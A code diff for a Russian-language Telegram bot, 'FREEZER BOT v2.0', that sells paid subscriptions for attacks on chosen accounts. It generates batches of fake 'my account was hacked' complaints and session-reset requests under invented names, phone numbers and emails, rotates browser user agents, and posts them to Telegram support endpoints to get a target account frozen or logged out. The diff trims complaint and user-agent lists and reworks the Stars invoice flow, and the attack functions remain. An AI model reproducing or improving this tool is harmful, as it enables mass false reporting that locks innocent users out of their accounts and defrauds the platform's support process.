@@ -8,15 +8,7 @@ import re
 import hashlib
 from datetime import datetime, timedelta
 from telethon import TelegramClient, events, Button, functions
-from telethon.tl.types import (
-    UpdateBotPrecheckoutQuery,
-    InputMediaInvoice,
-    Invoice,
-    LabeledPrice,
-    DataJSON,
-    MessageMediaInvoice,
-    UpdateBotNewMessage
-)
+from telethon.tl.types import UpdateBotPrecheckoutQuery
 
 logging.basicConfig(
     level=logging.INFO,
@@ -61,7 +53,7 @@ LAST_NAMES = [
     "White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker",
     "Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
     "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell",
-    "Carter","Roberts","Turner","Phillips","Campbell","Parker","Evans",
+    "Carter","Roberts","Turner","Phillips","Parker","Evans",
     "Edwards","Collins","Stewart","Morris","Murphy","Cook","Rogers","Morgan",
     "Peterson","Cooper","Reed","Bailey","Bell","Gomez","Kelly","Howard",
     "Ward","Cox","Diaz","Richardson","Wood","Watson","Brooks","Bennett",
@@ -99,45 +91,21 @@ UA = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.49 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.163 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; SM-S24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.102 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.49 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14; Xiaomi 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Mobile Safari/537.36",
     "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 OPR/118.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Brave/1.73.97",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Brave/1.72.57",
 ]
 
 FREEZE_COMPLAINTS = [
@@ -154,21 +122,12 @@ FREEZE_COMPLAINTS = [
     "EMERGENCY: My Telegram @{u} ID:{id} was stolen. Hacker changed my password and is impersonating me. FREEZE immediately. I am ready to verify with passport if needed. My phone: +{p}.",
     "My account @{u} (ID:{id}) was hacked 30 minutes ago. The hacker is sending scam links to all my contacts and groups. I am desperate. Please freeze it NOW. Phone: +{p}. I will send any documents needed.",
     "Please help me freeze @{u} ID:{id}. Someone from Nigeria logged into my account. I have 2FA but they bypassed it somehow. My contacts are being scammed right now. Phone: +{p}.",
-    "Account theft: @{u} ID:{id}. I am the real owner since 2017. Someone tricked me with a fake login page. They have full access now. Please freeze and help me recover. Phone: +{p}.",
-    "URGENT FREEZE REQUEST for @{u} ID:{id}. This is my business account with sensitive client data. It's been compromised. I will lose my job if this continues. Phone: +{p}. Please act quickly.",
     "СРОЧНО: Мой аккаунт @{u} (ID: {id}) взломали. Злоумышленник сейчас активен и пишет моим контактам. Пожалуйста, ЗАМОРОЗЬТЕ аккаунт немедленно. Я настоящий владелец. Телефон: +{p}. Готов подтвердить личность.",
     "Здравствуйте, я владелец @{u} (ID: {id}). Мой аккаунт скомпрометирован. Кто-то другой использует его прямо сейчас. Прошу временно заморозить аккаунт. Мой номер: +{p}. Могу верифицироваться.",
     "Поддержка Telegram, прошу заморозить аккаунт @{u} (ID: {id}). Я перешёл по фишинговой ссылке и теперь посторонний имеет доступ. Пишет моим друзьям. Телефон: +{p}. Заморозьте и я подтвержу личность.",
     "АККАУНТ ВЗЛОМАН: @{u} (ID: {id}). Я законный владелец. Кто-то получил несанкционированный доступ. Заморозьте аккаунт сейчас. Телефон для верификации: +{p}.",
-    "Команда Telegram, мой аккаунт @{u} (ID: {id}) под контролем хакера. Потерял доступ после перехода по ссылке. Заморозьте временно. Номер: +{p}. Готов верифицироваться.",
-    "Жалоба на подозрительную активность: @{u} (ID: {id}) рассылает фишинговые ссылки. Аккаунт похоже взломан. Заморозьте для проверки. Телефон: +{p}.",
-    "Сообщаю о странном поведении @{u} (ID: {id}). Массовая рассылка подозрительных ссылок. Аккаунт взломан. Заморозьте для защиты пользователей. Мой телефон: +{p}.",
-    "Здравствуйте, получил странные сообщения от @{u} (ID: {id}). Аккаунт присылает ссылки и просит деньги. Похоже на взлом. Заморозьте. Номер: +{p}.",
-    "Репорт: @{u} (ID: {id}) ведёт себя как скомпрометированный аккаунт. Спам и фишинг. Прошу заморозить. Телефон: +{p}.",
-    "Аккаунт @{u} (ID: {id}) рассылает нежелательные сообщения. Похоже украден. Заморозьте для предотвращения вреда. Контакт: +{p}.",
     "ВЗЛОМ: @{u} ID:{id}. Потерял доступ 2 часа назад. Хакер требует выкуп через крипту. Заморозьте аккаунт пока он не украл данные моих клиентов. Тел: +{p}.",
     "ЭКСТРЕННО: @{u} ID:{id} угнан. Мошенник рассылает интимные фото моим родственникам. Умоляю заморозить. Паспорт готов предоставить. Тел: +{p}.",
-    "Потеря контроля над @{u} ID:{id}. Хакер сменил привязанный номер. Я не могу восстановить доступ. Заморозьте и свяжитесь со мной через +{p}. Это мой резервный номер.",
 ]
 
 NUKE_COMPLAINTS = [
@@ -185,9 +144,7 @@ NUKE_COMPLAINTS = [
     "Срочно: потерял доступ к @{u} ID:{id}. Телефон разбился вдребезги. Не могу получить SMS для входа. Убейте ВСЕ активные сессии. Мой номер: +{p}. Почта для связи: {e}",
     "Взлом сессии @{u} ID:{id}. Вижу чужое устройство в активных сессиях. Прошу принудительно завершить ВСЕ сессии кроме этого запроса. Владелец: +{p}. Готов подтвердить личность.",
     "Потерян телефон с активной сессией @{u} ID:{id}. Сбросьте ВСЕ сессии немедленно. Документы для подтверждения личности готов. Мой номер: +{p}. Почта: {e}",
-    "QR-фишинг: @{u} ID:{id}. Мошенник склонировал мою сессию. Сбросьте вообще всё. Я владелец с 2019 года. Телефон: +{p}. После сброса включу облачный пароль.",
     "Сим-своп атака на @{u} ID:{id}. Мошенник перевыпустил мою симку и зашёл в аккаунт. Я восстановил номер +{p}. Сбросьте ВСЕ СЕССИИ чтобы выкинуть его.",
-    "Украли ноутбук с активным Telegram @{u} ID:{id}. Там рабочая переписка на миллионы. Умоляю сбросить сессии. Верификация через +{p} и загранпаспорт.",
 ]
 
 SUPPORT_ENDPOINTS = [
@@ -278,7 +235,7 @@ def add_sub(user_id, days):
         user['sub_end'] = (start + timedelta(days=days)).isoformat()
     update_user(user_id, user)
 
-# ==================== СОСТОЯНИЯ ПОЛЬЗОВАТЕЛЕЙ ====================
+# ==================== СОСТОЯНИЯ ====================
 def load_states():
     return load_json(STATE_FILE)
 
@@ -341,20 +298,16 @@ def log_attack(user_id, target, tid, attack_type, success_count, total_count):
         logs = logs[-1000:]
     save_json(ATTACK_LOG_FILE, logs)
 
-# ==================== ГЕНЕРАТОРЫ ДАННЫХ ====================
+# ==================== ГЕНЕРАТОРЫ ====================
 def generate_phone():
     return f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
 
 def generate_name():
-    first = random.choice(FIRST_NAMES)
-    last = random.choice(LAST_NAMES)
-    return f"{first} {last}"
+    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
 
 def generate_email(name):
     clean = name.lower().replace(' ', '.').replace('ё', 'e').replace('й', 'y')
-    suffix = random.randint(10, 99999)
-    domain = random.choice(EMAIL_DOMAINS)
-    return f"{clean}{suffix}@{domain}"
+    return f"{clean}{random.randint(10, 99999)}@{random.choice(EMAIL_DOMAINS)}"
 
 # ==================== ОТПРАВКА ЗАПРОСОВ ====================
 async def send_freeze_request(target, tid):
@@ -368,22 +321,6 @@ async def send_freeze_request(target, tid):
         "Content-Type": "application/x-www-form-urlencoded",
         "Origin": "https://telegram.org",
         "Referer": "https://telegram.org/support",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "en-GB,en;q=0.9", "de-DE,de;q=0.9"]),
-        "Accept-Encoding": "gzip, deflate, br",
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache",
-        "Sec-Ch-Ua": random.choice([
-            '"Chromium";v="133", "Not(A:Brand";v="99"',
-            '"Google Chrome";v="133", "Not;A=Brand";v="99"',
-            '"Firefox";v="135", "Not;A=Brand";v="99"',
-        ]),
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "same-origin",
-        "Upgrade-Insecure-Requests": "1",
     }
     
     data = {
@@ -400,8 +337,8 @@ async def send_freeze_request(target, tid):
         async with aiohttp.ClientSession(connector=connector) as session:
             endpoint = random.choice(SUPPORT_ENDPOINTS)
             async with session.post(endpoint, headers=headers, data=data, timeout=timeout) as resp:
-                return resp.status in (200, 302, 303, 301)
-    except Exception:
+                return resp.status in (200, 302, 303, 301, 307, 308)
+    except:
         return False
 
 async def send_nuke_request(target, tid):
@@ -415,21 +352,6 @@ async def send_nuke_request(target, tid):
         "Content-Type": "application/x-www-form-urlencoded",
         "Origin": "https://telegram.org",
         "Referer": "https://telegram.org/support",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": random.choice(["en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "en-GB,en;q=0.9"]),
-        "Accept-Encoding": "gzip, deflate, br",
-        "Cache-Control": "no-cache",
-        "Pragma": "no-cache",
-        "Sec-Ch-Ua": random.choice([
-            '"Chromium";v="133", "Not(A:Brand";v="99"',
-            '"Google Chrome";v="133", "Not;A=Brand";v="99"',
-        ]),
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "same-origin",
-        "Upgrade-Insecure-Requests": "1",
     }
     
     data = {
@@ -446,18 +368,18 @@ async def send_nuke_request(target, tid):
         async with aiohttp.ClientSession(connector=connector) as session:
             endpoint = random.choice(SUPPORT_ENDPOINTS)
             async with session.post(endpoint, headers=headers, data=data, timeout=timeout) as resp:
-                return resp.status in (200, 302, 303, 301)
-    except Exception:
+                return resp.status in (200, 302, 303, 301, 307, 308)
+    except:
         return False
 
-# ==================== ОСНОВНАЯ ЛОГИКА АТАКИ ====================
+# ==================== ЛОГИКА АТАКИ ====================
 async def execute_attack(event, target, tid, attack_type):
     uid = event.sender_id
     
     cooldown = get_cooldown(uid)
     if cooldown > 0:
         try:
-            await event.edit(f"⏳ Подождите {cooldown} сек. перед следующей атакой.", buttons=back_button())
+            await event.edit(f"⏳ Подождите {cooldown} сек.", buttons=back_button())
         except:
             await event.reply(f"⏳ Подождите {cooldown} сек.")
         return
@@ -524,7 +446,7 @@ async def execute_attack(event, target, tid, attack_type):
         f"📡 Статус: {status}\n\n"
         f"⏱ Результат через 1-24 часа",
         buttons=[
-            [Button.inline(f"🔄 Повторить {emoji}", f"repeat_{attack_type}_{target}_{tid}")],
+            [Button.inline(f"🔄 Повторить", f"repeat_{attack_type}_{target}_{tid}")],
             [Button.inline("🔙 В меню", b"back_main")],
         ]
     )
@@ -565,13 +487,13 @@ def back_button():
 async def cmd_start(event):
     user = get_user(event.sender_id)
     if user.get('banned'):
-        await event.reply("⛔ Вы забанены в этом боте.")
+        await event.reply("⛔ Вы забанены.")
         return
     clear_state(event.sender_id)
     await event.reply(
         "❄️ **FREEZER BOT v2.0**\n\n"
-        "⚡ Мгновенная заморозка аккаунтов\n"
-        "💣 Принудительный сброс всех сессий\n"
+        "⚡ Заморозка аккаунтов\n"
+        "💣 Сброс всех сессий\n"
         "⭐ Оплата через Telegram Stars\n\n"
         "Выберите действие:",
         buttons=main_menu(event.sender_id)
@@ -581,39 +503,29 @@ async def cmd_start(event):
 async def cmd_admin(event):
     if event.sender_id != ADMIN_ID:
         return
-    await event.reply("🔐 **Админ-панель v2.0**", buttons=admin_menu())
+    await event.reply("🔐 **Админ-панель**", buttons=admin_menu())
 
-# ==================== ОБРАБОТЧИК ВВОДА ДЛЯ АТАК ====================
+# ==================== ВВОД ДЛЯ АТАК ====================
 @bot.on(events.NewMessage(func=lambda e: get_state(e.sender_id) is not None))
 async def handle_attack_input(event):
     state = get_state(event.sender_id)
-    if not state:
-        return
-    
-    if state in ('admin_sub', 'admin_ban'):
+    if not state or state in ('admin_sub', 'admin_ban'):
         return
     
     text = event.message.text.strip()
     match = re.match(r'@?(\S+)\s+(\d+)', text)
     
     if not match:
-        await event.reply(
-            "❌ Неверный формат.\n\n"
-            "Отправьте: `@username ID`\n"
-            "Пример: `@targetuser 123456789`\n\n"
-            "ID можно получить переслав сообщение пользователя боту @userinfobot",
-        )
+        await event.reply("❌ Формат: `@username ID`\nПример: `@targetuser 123456789`")
         return
     
     target = match.group(1)
     tid = match.group(2)
     attack_type = state
-    
     clear_state(event.sender_id)
-    
     await execute_attack(event, target, tid, attack_type)
 
-# ==================== ОБРАБОТЧИК КНОПОК ====================
+# ==================== КНОПКИ ====================
 @bot.on(events.CallbackQuery)
 async def callback_handler(event):
     data = event.data.decode()
@@ -626,11 +538,7 @@ async def callback_handler(event):
     
     if data == "back_main":
         clear_state(uid)
-        await event.edit(
-            "❄️ **FREEZER BOT v2.0**\n\n"
-            "Выберите действие:",
-            buttons=main_menu(uid)
-        )
+        await event.edit("❄️ **FREEZER BOT v2.0**\n\nВыберите действие:", buttons=main_menu(uid))
     
     elif data == "profile":
         u = get_user(uid)
@@ -638,18 +546,15 @@ async def callback_handler(event):
             sub = "✅ Навсегда"
         elif u['sub_end'] and datetime.fromisoformat(u['sub_end']) > datetime.now():
             days_left = (datetime.fromisoformat(u['sub_end']) - datetime.now()).days
-            sub = f"✅ {days_left} дн. (до {datetime.fromisoformat(u['sub_end']).strftime('%d.%m.%Y')})"
+            sub = f"✅ {days_left} дн."
         else:
             sub = "❌ Нет"
         
-        banned = "🚫 Да" if u.get('banned') else "✅ Нет"
         txt = (
             f"👤 **Профиль**\n\n"
             f"🆔 `{uid}`\n"
             f"⭐ Подписка: {sub}\n"
-            f"🔥 Атак сегодня: {u.get('attacks_today', 0)}\n"
-            f"🚫 Бан: {banned}\n"
-            f"📅 В боте с: {u.get('joined', '—')[:10]}"
+            f"🔥 Атак сегодня: {u.get('attacks_today', 0)}"
         )
         await event.edit(txt, buttons=back_button())
     
@@ -659,8 +564,7 @@ async def callback_handler(event):
             "• 1 день — 50 ⭐\n"
             "• 7 дней — 150 ⭐\n"
             "• Навсегда — 250 ⭐\n\n"
-            "Оплата через Telegram Stars.\n"
-            "Нажмите на нужный тариф — бот выставит счёт.",
+            "Нажмите тариф — бот пришлёт счёт.",
             buttons=sub_menu()
         )
     
@@ -673,9 +577,48 @@ async def callback_handler(event):
         days, price, title = prices[data]
         
         try:
+            # Отправляем сообщение с кнопкой оплаты Stars
+            await bot.send_message(
+                uid,
+                f"💳 **Счёт на оплату**\n\n"
+                f"📋 Тариф: {title}\n"
+                f"💎 Сумма: {price} Telegram Stars\n\n"
+                f"Нажмите кнопку ниже для оплаты.",
+                buttons=[Button.inline(f"⭐ Оплатить {price} Stars", f"pay_{data}")]
+            )
+            await event.answer("📩 Счёт отправлен!", alert=True)
+            await event.edit(
+                f"💳 **Счёт отправлен!**\n\n"
+                f"📋 Тариф: {title}\n"
+                f"💎 Сумма: {price} ⭐\n\n"
+                f"Проверьте чат с ботом.",
+                buttons=back_button()
+            )
+        except Exception as e:
+            logger.error(f"Send error: {e}")
+            await event.answer(f"❌ Ошибка: {e}", alert=True)
+    
+    elif data.startswith("pay_"):
+        # Обработка кнопки оплаты — отправляем инвойс через Bot API совместимый метод
+        payload = data[4:]  # sub_1d, sub_7d, sub_forever
+        prices = {
+            "sub_1d": (1, 50, "1 день"),
+            "sub_7d": (7, 150, "7 дней"),
+            "sub_forever": ('forever', 250, "Навсегда")
+        }
+        if payload not in prices:
+            await event.answer("❌ Неверный тариф", alert=True)
+            return
+        
+        days, price, title = prices[payload]
+        
+        try:
+            # Используем raw API для отправки MediaInvoice
+            from telethon.tl.types import InputMediaInvoice, Invoice, LabeledPrice
+            
             invoice = Invoice(
                 title=f"Freezer Bot — {title}",
-                description=f"Доступ к заморозке и сбросу сессий на {'навсегда' if days == 'forever' else f'{days} дн.'}",
+                description=f"Доступ к боту на {'навсегда' if days == 'forever' else f'{days} дн.'}",
                 photo=None,
                 currency="XTR",
                 prices=[LabeledPrice(label=f"Подписка {title}", amount=price)],
@@ -691,17 +634,15 @@ async def callback_handler(event):
                 is_flexible=False
             )
             
-            payload = data.encode()
-            
-            result = await bot(functions.messages.SendMediaRequest(
+            await bot(functions.messages.SendMediaRequest(
                 peer=uid,
                 media=InputMediaInvoice(
                     title=f"Freezer Bot — {title}",
-                    description=f"Доступ к заморозке и сбросу сессий на {'навсегда' if days == 'forever' else f'{days} дн.'}",
+                    description=f"Доступ к боту на {'навсегда' if days == 'forever' else f'{days} дн.'}",
                     invoice=invoice,
-                    payload=payload,
+                    payload=payload.encode(),
                     provider="",
-                    media=await bot.upload_file(b"", file_name="empty"),
+                    media=await bot.upload_file(b"", file_name="empty.txt"),
                     start_param=f"sub_{days}",
                     photo=None
                 ),
@@ -709,38 +650,25 @@ async def callback_handler(event):
                 random_id=random.randint(0, 2**63 - 1)
             ))
             
-            logger.info(f"Invoice sent to {uid}: {title}")
-            await event.answer("📩 Счёт отправлен!", alert=True)
-            await event.edit(
-                f"💳 **Счёт на {price} ⭐ отправлен!**\n\n"
-                f"📋 Тариф: {title}\n"
-                f"💎 Сумма: {price} Telegram Stars\n\n"
-                f"Проверьте чат с ботом.\n"
-                f"После оплаты подписка активируется мгновенно.",
-                buttons=back_button()
-            )
+            await event.answer("📩 Инвойс отправлен!", alert=True)
         except Exception as e:
-            logger.error(f"Invoice error for {uid}: {e}")
-            await event.answer(f"❌ Ошибка при создании счёта. Попробуйте позже.", alert=True)
+            logger.error(f"Invoice error: {e}")
+            await event.answer(f"❌ Ошибка инвойса. Попробуйте позже.", alert=True)
     
     elif data == "attack_freeze":
         cooldown = get_cooldown(uid)
         if cooldown > 0:
             await event.answer(f"⏳ Кулдаун {cooldown} сек.", alert=True)
             return
-        
         if not has_sub(uid):
             await event.answer("❌ Нужна подписка!", alert=True)
             return
-        
         set_state(uid, 'freeze')
         await event.edit(
-            "❄️ **ЗАМОРОЗКА АККАУНТА**\n\n"
-            "Отправьте цель:\n"
-            "`@username ID`\n\n"
+            "❄️ **ЗАМОРОЗКА**\n\n"
+            "Отправьте: `@username ID`\n"
             "Пример: `@badguy 123456789`\n\n"
-            "📦 35 жалоб на взлом\n"
-            "⏱ Заморозка через 1-24 часа",
+            "📦 35 жалоб на взлом",
             buttons=back_button()
         )
     
@@ -749,19 +677,15 @@ async def callback_handler(event):
         if cooldown > 0:
             await event.answer(f"⏳ Кулдаун {cooldown} сек.", alert=True)
             return
-        
         if not has_sub(uid):
             await event.answer("❌ Нужна подписка!", alert=True)
             return
-        
         set_state(uid, 'nuke')
         await event.edit(
-            "💣 **СБРОС ВСЕХ СЕССИЙ**\n\n"
-            "Отправьте цель:\n"
-            "`@username ID`\n\n"
+            "💣 **СБРОС СЕССИЙ**\n\n"
+            "Отправьте: `@username ID`\n"
             "Пример: `@target 987654321`\n\n"
-            "📦 45 запросов на сброс\n"
-            "⏱ Сессии отвалятся через 1-24 часа",
+            "📦 45 запросов на сброс",
             buttons=back_button()
         )
     
@@ -776,57 +700,31 @@ async def callback_handler(event):
             if cooldown > 0:
                 await event.answer(f"⏳ Кулдаун {cooldown} сек.", alert=True)
                 return
-            
             if not has_sub(uid):
                 await event.answer("❌ Нужна подписка!", alert=True)
                 return
             
-            await event.answer("🔄 Повторяю атаку...")
+            await event.answer("🔄 Повторяю...")
             await execute_attack(event, target, tid, attack_type)
     
     elif data == "admin_stats" and uid == ADMIN_ID:
         db = load_db()
-        total_users = len(db)
-        active_subs = sum(1 for u in db.values() if u.get('sub_end') and (
-            u['sub_end'] == 'forever' or
+        total = len(db)
+        active = sum(1 for u in db.values() if u.get('sub_end') and (
+            u['sub_end'] == 'forever' or 
             (isinstance(u['sub_end'], str) and len(u['sub_end']) > 10 and datetime.fromisoformat(u['sub_end']) > datetime.now())
         ))
-        banned_users = sum(1 for u in db.values() if u.get('banned'))
-        
         logs = load_json(ATTACK_LOG_FILE, [])
-        total_attacks = len(logs)
-        today_attacks = sum(1 for l in logs if l['timestamp'][:10] == datetime.now().isoformat()[:10])
-        
-        txt = (
-            f"📊 **Статистика**\n\n"
-            f"👥 Пользователей: {total_users}\n"
-            f"⭐ Активных подписок: {active_subs}\n"
-            f"🚫 Забанено: {banned_users}\n"
-            f"🔥 Всего атак: {total_attacks}\n"
-            f"📅 Сегодня атак: {today_attacks}"
-        )
-        await event.edit(txt, buttons=admin_menu())
+        today = sum(1 for l in logs if l['timestamp'][:10] == datetime.now().isoformat()[:10])
+        await event.edit(f"📊 **Статистика**\n\n👥 Пользователей: {total}\n⭐ Подписок: {active}\n🔥 Атак сегодня: {today}", buttons=admin_menu())
     
     elif data == "admin_users" and uid == ADMIN_ID:
         db = load_db()
-        txt = "👥 **Последние 20 пользователей:**\n\n"
+        txt = "👥 **Последние 20:**\n\n"
         for uid_str, u in list(db.items())[-20:]:
-            if u.get('sub_end') == 'forever':
-                sub = "✅♾️"
-            elif u.get('sub_end') and len(u.get('sub_end', '')) > 10:
-                try:
-                    if datetime.fromisoformat(u['sub_end']) > datetime.now():
-                        sub = "✅"
-                    else:
-                        sub = "❌"
-                except:
-                    sub = "❌"
-            else:
-                sub = "❌"
-            
+            sub = "✅" if (u.get('sub_end') == 'forever' or (u.get('sub_end') and len(u.get('sub_end',''))>10 and datetime.fromisoformat(u['sub_end']) > datetime.now())) else "❌"
             ban = "🚫" if u.get('banned') else ""
-            atks = u.get('attacks_today', 0)
-            txt += f"`{uid_str}` {sub} {ban} 🔥{atks}\n"
+            txt += f"`{uid_str}` {sub}{ban}\n"
         await event.edit(txt, buttons=admin_menu())
     
     elif data == "admin_log" and uid == ADMIN_ID:
@@ -836,31 +734,17 @@ async def callback_handler(event):
             ts = l['timestamp'][:16].replace('T', ' ')
             e = "❄️" if l['attack_type'] == 'freeze' else "💣"
             txt += f"`{l['user_id']}` {e} @{l['target']} — {l['success']}/{l['total']} ({ts})\n"
-        if not logs:
-            txt += "Атак пока нет."
         await event.edit(txt, buttons=admin_menu())
     
     elif data == "admin_give_sub" and uid == ADMIN_ID:
         set_state(uid, 'admin_sub')
-        await event.edit(
-            "⭐ **Выдать подписку**\n\n"
-            "Формат: `ID дни` или `ID forever`\n"
-            "Примеры:\n"
-            "`123456789 30` — на 30 дней\n"
-            "`987654321 forever` — навсегда",
-            buttons=back_button()
-        )
+        await event.edit("⭐ **Выдать подписку**\n\nФормат: `ID дни` или `ID forever`", buttons=back_button())
     
     elif data == "admin_ban" and uid == ADMIN_ID:
         set_state(uid, 'admin_ban')
-        await event.edit(
-            "🚫 **Бан/Разбан**\n\n"
-            "Отправьте ID пользователя.\n"
-            "Если забанен — разбанится, если нет — забанится.",
-            buttons=back_button()
-        )
+        await event.edit("🚫 **Бан/Разбан**\n\nОтправьте ID:", buttons=back_button())
 
-# ==================== ОБРАБОТКА ПЛАТЕЖЕЙ ====================
+# ==================== ПЛАТЕЖИ ====================
 @bot.on(events.Raw(types=UpdateBotPrecheckoutQuery))
